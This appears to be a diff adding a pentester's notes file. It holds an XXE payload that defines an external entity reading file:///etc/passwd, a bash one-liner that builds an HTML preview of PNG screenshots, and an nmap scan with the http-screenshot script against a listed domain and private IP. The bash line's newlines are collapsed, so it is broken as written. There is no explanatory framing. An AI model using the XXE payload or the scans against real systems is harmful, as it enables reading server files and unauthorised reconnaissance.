@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY file SYSTEM "file:///etc/passwd"> 
+]>
+
+&file;
+
+
+#!/bin/bash printf "<HTML><BODY><BR>" > preview.html ls -1 *.png | awk -F : '{ print $1":"$2"\n<BR><IMG SRC=\""$1"%3A"$2"\" width=400><BR><BR>"}' >> preview.html printf "</BODY></HTML>" >> preview.html
+
+
+cat > scope << EOF
+lg.lc
+192.168.2.1
+192.168.2.1
+EOF
+nmap -n -iL scope -oA scan1 -v -sC --script=http-screenshot
